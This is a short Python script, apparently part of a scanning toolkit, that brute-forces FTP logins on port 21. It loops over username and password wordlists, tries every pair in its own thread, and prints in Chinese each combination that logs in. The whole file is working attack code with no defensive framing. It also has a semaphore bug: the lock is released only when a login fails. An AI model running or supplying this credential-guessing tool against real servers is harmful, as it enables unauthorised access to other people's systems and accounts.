import ftplib
import threading
def ftpScan(t, i, o, u, p):
    try:
        t.acquire()
        ftp = ftplib.FTP()
        ftp.connect(i, o, 2)
        ftp.login(u, p)
        ftp.quit()
        print('[+]FTP连接成功，用户：%s,密码：%s' % (u, p))
    except:
        t.release()

def ftp(ip):
    with open('./static/username.txt', 'r')as f:
        user = f.readlines()
    with open('./static/password.txt', 'r')as f:
        passw = f.readlines()
    # ip = input("请输入IP：").strip()
    # port = input("请输入端口：").strip()
    s = threading.Semaphore(10)
    for i in user:
        username = i.strip()
        for j in passw:
            password = j.strip()
            t = threading.Thread(target=ftpScan, args=(s, ip, 21, username, password))
            t.start()